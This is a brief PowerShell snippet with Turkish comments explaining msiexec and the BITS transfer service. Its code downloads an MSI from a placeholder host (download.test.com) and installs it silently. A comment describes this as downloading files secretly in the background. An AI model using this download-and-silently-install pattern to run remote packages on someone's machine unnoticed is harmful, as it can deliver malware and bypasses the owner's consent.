# Ne nedir ?
# Msiexec.exe program kurulumlarında devreye girer ve programların kurulmasını sağlar.
# BITS, istemci ve sunucu arasında dosyaları aktaran bir hizmettir
# Arka planda msiexec ile gizlice dosya indirmek
Import-Module BitsTransfer
Start-BitsTransfer -Source "https://download.test.com/file.msi" -Destination "C:\file-name.msi"
$control = Test-Path -Path "C:\file-name.msi"
while($control){
Start-Process msiexec.exe -Wait -ArgumentList '/I C:\file-name.msi /quiet /norestart /l C:\installlog.txt'
$control = $False
}
